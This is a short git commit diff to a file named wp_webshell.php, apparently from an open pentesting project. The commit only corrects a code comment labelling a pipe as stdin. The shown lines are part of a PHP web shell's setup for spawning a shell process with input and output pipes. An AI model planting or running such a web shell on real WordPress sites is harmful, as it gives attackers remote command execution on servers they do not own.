359aaca979ce2305cad3da97884a3cd5ac9a89fc
Podalirius <79218792+p0dalirius@users.noreply.github.com>
2022-06-22 09:55:23 +0200

    Update wp_webshell.php

--- wp_webshell/wp_webshell.php
+++ wp_webshell/wp_webshell.php
@@ -46,7 +46,7 @@ if ($action == "download") {
 
     // Spawn shell process
     $descriptorspec = array(
-        0 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+        0 => array("pipe", "w"),  // stdin is a pipe that the child will read from
         1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
         2 => array("pipe", "w")   // stderr is a pipe that the child will write to
     );
